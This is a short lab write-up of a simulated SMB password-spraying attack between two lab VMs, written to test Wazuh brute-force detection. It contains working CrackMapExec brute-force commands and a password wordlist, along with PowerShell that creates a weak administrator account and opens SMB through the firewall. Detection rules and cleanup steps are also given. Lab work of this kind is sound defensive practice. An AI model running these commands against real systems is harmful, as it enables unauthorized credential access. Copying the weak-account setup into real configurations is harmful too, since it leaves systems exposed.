# Attack 01 — SMB Brute Force

## Overview

|Field|Details|
|-|-|
|MITRE ID|T1110.002|
|Tactic|Credential Access|
|Severity|High|
|Tool|CrackMapExec|
|Wazuh Rule|60204 — Level 10|
|Attacker|Kali Linux (192.168.56.106)|
|Target|Windows 10 VM (192.168.56.105)|

## Objective

Simulate a password spraying attack against SMB port 445 to trigger Wazuh brute force detection rules and Windows account lockout policies.

## Execution Steps

1. Create weak test user account on Windows VM
2. Enable SMB protocol and allow through Windows firewall
3. Create targeted password wordlist on Kali
4. Run CrackMapExec brute force against Windows SMB
5. Verify Rule 60204 fires in Wazuh dashboard

## Commands

### Windows VM — PowerShell as Administrator

```powershell
# Create weak test user
New-LocalUser -Name "labuser" -Password (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force)
Add-LocalGroupMember -Group "Administrators" -Member "labuser"

# Enable SMB
Set-SmbServerConfiguration -EnableSMB2Protocol $true -Force
netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes
```

### Kali Linux

```bash
# Create wordlist
cat > /tmp/passwords.txt << WORDLIST
admin
123456
letmein
Summer2024!
WORDLIST

# Run brute force
crackmapexec smb 192.168.56.105 -u labuser -p /tmp/passwords.txt
```

## Expected Output

```
\[-] DESKTOP-XXX\\labuser:admin STATUS\_LOGON\_FAILURE
\[-] DESKTOP-XXX\\labuser:123456 STATUS\_LOGON\_FAILURE
\[+] DESKTOP-XXX\\labuser:Summer2024! (Pwned!)
```

## Detection

* **Rule ID:** 60204 — Level 10
* **Event IDs:** 4625 (Failed Logon), 4740 (Account Lockout)
* **Dashboard Search:** labuser OR rule.id:60204

## Attack Timeline

|Time|Event|
|-|-|
|T+00:00|CrackMapExec initiates SMB connections|
|T+00:01|EID 4625 — Multiple failed logon attempts begin|
|T+00:03|Rule 60204 fires — brute force threshold crossed|
|T+00:05|EID 4740 — Account lockout triggered|

## Cleanup

```powershell
Disable-LocalUser -Name "labuser"
```

